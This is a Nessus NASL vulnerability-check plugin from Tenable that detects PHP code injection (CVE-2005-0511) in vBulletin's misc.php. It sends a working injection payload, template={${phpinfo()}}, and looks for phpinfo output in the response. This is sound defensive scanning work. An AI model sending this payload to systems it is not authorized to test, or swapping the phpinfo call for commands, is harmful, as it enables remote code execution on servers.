#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(17211);
 script_version("$Revision: 1.16 $");
 script_cve_id("CVE-2005-0511");
 script_bugtraq_id(12622);
 script_osvdb_id(14047);

 script_name(english:"vBulletin misc.php template Parameter PHP Code Injection");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that allows execution of
arbitrary PHP code." );
 script_set_attribute(attribute:"description", value:
"The remote version of vBulletin fails to sanitize input to the
'template' parameter of the 'misc.php' script.  Provided the 'Add
Template Name in HTML Comments' setting in vBulletin is enabled, an
unauthenticated attacker may use this flaw to execute arbitrary PHP
commands on the remote host." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2005/Feb/542");
 script_set_attribute(attribute:"solution", value:
"Upgrade to vBulletin 3.0.7 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:H/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'vBulletin misc.php Template Name Arbitrary Code Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/02/24");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/02/22");
 script_cvs_date("$Date: 2016/11/03 14:16:36 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:vbulletin:vbulletin");
script_end_attributes();

 script_summary(english:"Executes phpinfo() on the remote host");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencies("vbulletin_detect.nasl");
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_ports("Services/www", 80);
 script_require_keys("www/vBulletin");
 exit(0);
}

# Check starts here
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if ( ! can_host_php(port:port) ) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/vBulletin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];
  r = http_send_recv3(method:"GET",item:dir + "/misc.php?do=page&template={${phpinfo()}}", port:port);
  if (isnull(r)) exit(0);
  res = r[2];
  if ( "<title>phpinfo()</title>" >< res ) security_warning(port);
}
